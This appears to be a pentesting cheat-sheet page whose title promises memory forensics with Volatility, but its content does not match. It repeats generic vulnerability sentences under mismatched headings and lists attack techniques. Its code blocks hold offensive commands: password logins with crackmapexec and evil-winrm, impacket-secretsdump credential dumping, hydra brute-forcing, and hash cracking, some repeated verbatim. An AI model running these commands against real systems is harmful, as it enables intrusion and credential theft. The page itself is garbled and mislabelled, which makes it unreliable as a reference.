---
TitleSEO: "Memory Forensics with Volatility | ZureFX"
TitlePost: "Memory Forensics with Volatility"
Author: "ZureFX"
Description: "Personal notes on Memory Forensics with Volatility. Quick reference for pentesting and CTF challenges."
Keywords: "networking, persistence, lateral movement, windows, linux"
URL: "https://zurefx.github.io/notes/note-memory-forensics-with-volatility-579.html"
URL_IMAGES: ""
Date: "2024-08-31"
Tags: "Networking, Persistence, Lateral Movement, Windows, Linux"
Section: "notes"
Lang: "en"
main_img: "note-memory-forensics-with-volatility-579"
Permalink: "/notes/note-memory-forensics-with-volatility-579.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Command Injection

### WinRM

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

- `smbexec`
- `socat`
- `Writable PATH`

## Django

### WordPress

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

- `burpsuite`
- `SQL Injection`
- `impacket`
- `dcomexec`
- `Docker Escape`

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

## Docker Escape

### MySQL

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
crackmapexec smb 10.42.248.195 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.109.36.92 -u administrator -p 'P@ssw0rd!'
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.20.96 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Kerberoasting

### RDP

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.83.122.241/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.91.101.237/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.224.37
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.88.195
```

- `DCSync`
- `Kerberoasting`
- `ligolo-ng`
- `dcomexec`

- `Silver Ticket`
- `psexec`
- `wpscan`
- `Pass the Ticket`
- `john`
- `LXD Privilege Escalation`
